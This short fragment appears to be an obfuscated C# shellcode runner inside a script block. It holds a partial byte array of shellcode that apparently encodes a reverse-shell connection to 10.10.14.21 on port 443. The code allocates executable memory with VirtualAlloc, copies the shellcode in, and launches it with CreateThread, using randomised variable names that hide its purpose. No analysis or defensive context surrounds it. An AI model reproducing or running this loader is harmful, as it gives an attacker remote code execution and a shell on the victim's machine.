...
0x68,0x0a,0x0a,0x0e,0x15,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr noQ = VirtualAlloc(IntPtr.Zero,(UIntPtr)m5hf7uE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(m5hf7uE,0,noQ,m5hf7uE.Length);
        IntPtr k3EIOk = IntPtr.Zero;
        IntPtr lAXT5jXk = CreateThread(IntPtr.Zero,UIntPtr.Zero,noQ,IntPtr.Zero,0,ref k3EIOk);
    }
</script>
